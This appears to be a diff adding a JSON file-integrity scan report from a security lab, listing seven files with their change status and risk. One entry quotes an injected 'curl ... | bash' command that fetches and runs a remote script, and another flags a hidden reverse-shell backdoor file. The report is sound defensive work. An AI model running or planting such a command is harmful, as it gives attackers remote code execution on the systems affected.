@@ -1,0 +1,72 @@
+[
+  {
+    "id": 1,
+    "file_path": "lab/config/app.conf",
+    "status": "MODIFIED",
+    "expected_change": "No",
+    "risk_level": "Medium",
+    "baseline_hash_prefix": "29bd9f083a6535b6",
+    "scan_date": "2026-11-22",
+    "explanation": "Debug mode changed false->true (unapproved config change)"
+  },
+  {
+    "id": 2,
+    "file_path": "lab/config/db.conf",
+    "status": "DELETED",
+    "expected_change": "No",
+    "risk_level": "Medium",
+    "baseline_hash_prefix": "4049f94127abf0d4",
+    "scan_date": "2026-11-22",
+    "explanation": "File deleted; app may fail or tampering hidden"
+  },
+  {
+    "id": 3,
+    "file_path": "lab/docs/policy.txt",
+    "status": "OK",
+    "expected_change": "n/a",
+    "risk_level": "None",
+    "baseline_hash_prefix": "fa245de4258e6aa4",
+    "scan_date": "2026-11-22",
+    "explanation": "Only timestamp changed; content intact"
+  },
+  {
+    "id": 4,
+    "file_path": "lab/docs/readme.md",
+    "status": "MODIFIED",
+    "expected_change": "Yes",
+    "risk_level": "Low",
+    "baseline_hash_prefix": "63115ce3ad2f4fdd",
+    "scan_date": "2026-11-22",
+    "explanation": "Approved change CHG-101 (contact line added)"
+  },
+  {
+    "id": 5,
+    "file_path": "lab/scripts/backup.sh",
+    "status": "MODIFIED",
+    "expected_change": "No",
+    "risk_level": "High",
+    "baseline_hash_prefix": "9e459507c4750184",
+    "scan_date": "2026-11-22",
+    "explanation": "Malicious 'curl http://203.0.113.9/x.sh | bash' injected (remote code execution)"
+  },
+  {
+    "id": 6,
+    "file_path": "lab/scripts/report.py",
+    "status": "OK",
+    "expected_change": "n/a",
+    "risk_level": "None",
+    "baseline_hash_prefix": "261b46e61055f97b",
+    "scan_date": "2026-11-22",
+    "explanation": "No change"
+  },
+  {
+    "id": 7,
+    "file_path": "lab/scripts/.hidden_update.sh",
+    "status": "ADDED",
+    "expected_change": "No",
+    "risk_level": "High",
+    "baseline_hash_prefix": "N/A",
+    "scan_date": "2026-11-22",
+    "explanation": "Hidden file with reverse-shell command (backdoor/persistence)"
+  }
+]
